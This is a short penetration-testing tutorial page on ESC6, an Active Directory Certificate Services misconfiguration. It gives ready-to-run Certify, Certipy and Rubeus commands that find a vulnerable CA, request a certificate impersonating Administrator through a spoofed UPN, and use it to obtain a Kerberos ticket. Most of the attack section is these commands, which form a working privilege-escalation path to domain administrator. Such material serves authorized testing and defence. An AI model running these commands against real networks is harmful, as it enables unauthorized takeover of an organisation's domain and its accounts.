---
title: 'ESC6: The Sure, Be Whoever You Want Registry Key'
description: 'ESC6: The "Sure, Be Whoever You Want" Registry Key.'
---
# ESC6: The "Sure, Be Whoever You Want" Registry Key

ESC6 occurs when the Certificate Authority has a specific registry key enabled: `EDITF_ATTRIBUTESUBJECTALTNAME2`. 

Normally, if a certificate template doesn't explicitly allow you to supply a Subject Alternative Name (SAN), the CA will reject any request that tries to sneak one in. 

However, if `EDITF_ATTRIBUTESUBJECTALTNAME2` is enabled on the CA itself, it acts as a global override. It tells the CA: "Actually, let anyone supply a SAN, regardless of what the individual template says." It's the equivalent of a VIP pass that works at every club in the city.

## Requirements

* The `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is enabled on the CA.
* A template that allows Client Authentication and allows low-privileged users to enroll.
* (Optional) A sysadmin who really didn't want to troubleshoot certificate enrollment errors.

## The Attack Path

### 1. Spot the Flag
You can identify this vulnerability by querying the CA configuration.
* **Using Certify**:
    ```powershell
    Certify.exe find /vulnerable
    ```
    *Look for the line: `User Specified SAN       : True` under the CA properties.*
* **Using Certipy**:
    ```bash
    certipy find -u 'john' -p 'Passw0rd!' -d 'domain.local' -dc-ip 192.168.100.1 -vulnerable
    ```

### 2. Request the Spoofed Certificate
Find *any* template that allows you to enroll and is valid for Client Authentication. Because of the registry key, you can slap a SAN on the request, and the CA will happily sign it.
```bash
certipy req 'domain.local/john:Passw0rd!@ca.domain.local' -ca 'domain-CA' -template 'User' -upn 'Administrator@domain.local'
```

### 3. Authenticate
Take your shiny new Administrator certificate and ask the KDC for a TGT.
```powershell
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
```

!!! tip
    This vulnerability is becoming rarer as Microsoft pushes updates, but when you find it, it turns almost any boring User template into an ESC1 vector. Happy hunting!
